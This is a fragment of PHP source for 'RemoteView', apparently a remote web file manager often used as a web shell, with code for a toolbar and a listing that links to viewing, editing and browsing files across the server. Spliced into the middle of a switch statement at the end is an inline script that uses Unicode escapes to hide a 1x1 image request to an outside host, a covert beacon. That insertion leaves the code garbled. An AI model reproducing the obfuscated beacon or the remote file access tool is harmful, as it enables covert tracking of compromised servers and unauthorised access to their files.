         case 'home': return "http://php.spb.ru/remview/";
         case 'papki': return "$self?c=tree&d=".urlencode($d);
         case 'setup': return "$self?c=t";
         case 'back': return "javascript:history.back(-1)";
      }
   }
   echo '<td colspan='.strlen($cn).'>
   <table border=0 cellspacing=0 cellpadding=2><tr>';
   $buttons=array('back','up','refresh','edit','mode','disk','full','papki','setup','home');
   $tmp=strtoupper($d[0]);
   for ($i=0; $i<count($buttons); $i++) {
      if ($buttons[$i]=='full') {
         echo '<td class=window width=90% align=center nowrap><font color=#999999 face="Arial Black" 
         style="font-size: 11pt;">&lt;?php<u>R</u>emote<u>V</u>iew?&gt;</font></td>';
         continue;
      }
      if ($buttons[$i]=='disk') {
         if (!$win) continue;
         echo '<td width=1% title=\'Select dist\' class=window onMouseOver="this.style.backgroundColor=\'#eeee88\'" '.
              ' onMouseOut="this.style.backgroundColor=\'\'">';
         echo "<select name=disk size=1; style='font: 9pt Arial Black; color: #999999 '
         onChange='location.href=\"$self?c=l&d=\"+document.main.disk.options[document.main.disk.selectedIndex].value+\":/\"'>";
         for ($j=ord('A'); $j<=ord('Z'); $j++) 
            echo '<option value="'.chr($j).'"'.(chr($j)==$tmp?" selected":"").'>'.chr($j);
         echo "</select></td>";
         continue;
      }
      $bturl=button_url($buttons[$i]);
      echo '<td width=1% title=\''.$button_help[$buttons[$i]].'\' class=window'.
           ' onMouseMove="this.style.backgroundColor=\'#eeee88\';window.status=\'** '.$button_help[$buttons[$i]].' ** '.$bturl.'\'"'.
           ' onMouseOut="this.style.backgroundColor=\'\';window.status=\'\'"'.
           ' onClick=\'location.href="'.$bturl.'"\'><a href=';
      echo button_url($buttons[$i]);
      echo '><img HSPACE=3 border=0 src='.$self.'?c=img&name='.$buttons[$i].'></a></td>';
   }
   echo '</tr></table>
   </td></tr><tr>';


   for ($i=0; $i<strlen($cn); $i++) {
      echo "<td nowrap class=title onClick='location.href=\"".
           "$self?c=set&c2=sort&name=$i&pan=$panel&ref=$uurl\"'";
      switch ($cn[$i]) {
         case 1: case 2: case 3: case "s": echo " width=13%"; break;
         case 't': echo " width=2%"; break;
         case 'n': echo " width=40%"; break;
      }
      echo "><a href='$self?c=set&c2=sort&name=$i&pan=$panel&ref=$uurl' class=black>";
      switch ($cn[$i]) {
         case "n": case "t": case "s": case "o": case "g": 
         case "a": case "c": case "1": case "2": case "3": 
            echo "\xA0".$cn_name[$cn[$i]]."\xA0"; break;
         default: 
            echo "??$cn[$i]??";
      }
      if ($cc[0]==="$i") {
         if ($cc[1]=='0') echo "<img src=$self?c=img&name=sort_asc border=0>";
         else echo "<img src=$self?c=img&name=sort_desc border=0>";
      }
      echo '</a></td>';
   }
   echo '</tr>';
   
   echo "\n\n<script>\n\n";
   foreach ($names as $k=>$v) {

      echo "\n\n// $k \n";
      echo 'tr(';
      
      for ($i=0; $i<strlen($cn); $i++) {

         switch ($cn[$i]) {
         
            case 'n': 
               switch($ftype[$k]) {
               case 'file':
                  $vv=strtolower(substr($k,strlen($k)-4,4));
                  $add="";
                  if ($vv==".gif" || $vv==".jpg" || $vv==".png" || $vv==".bmp"
                     || $vv==".ico" || $vv=="jpeg") $add="&ftype=2&fnot=1";
                  if (substr($k,0,5)=="sess_") $add="&ftype=4";
                  $ln='<a href='.$self.'?&c=v&d='.urlencode($d).
                  '&f='.urlencode($k).$add.'>';
                  break;

               default:
                  $ln='<a href='.$self.'?&c=l&d='.urlencode($d.$k).'>';
                  break;
               }
               
               if ($ftype[$k]=='dir') 
                  $ln.='<img src='.$self.'?c=img&name=dir border=0>';
               else {
                  $found=0;
                  foreach ($ext as $kk=>$vv) {
                     if (in_array(strtolower($fext[$k]),$vv)) {
                        $ln.='<img src='.$self.'?c=img&name='.$kk.' border=0>';
                        $found=1;
                        break;
                     }
                  }
                  if (!$found)
                     $ln.='<img src='.$self.'?c=img&name=unk border=0>';
               }
               $ln.=substr($k,0,48).'</a>';
               echo jsval($ln);

               break; 

            case "t": 
               switch ($ftype[$k]) {
               case "dir":
                  echo jsval("<a href=$self?c=d&d=".urlencode($d.$k).">DIR</a>"); 
                  break;
               case "file":
                  echo jsval("<a href=$self/".urlencode($k)."?&c=v&fnot=1&ftype=3&d=".
                     urlencode($d)."&f=".urlencode($k)." class=sym>\xF2</a> ".
                     "<a href=$self?&c=i&d=".urlencode($d)."&f=".urlencode($k)." class=sym>\xF0</a>");
                  break;
               case "link":
                  echo jsval("<font class=t>&#8212;&gt;</font>");
               <script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>

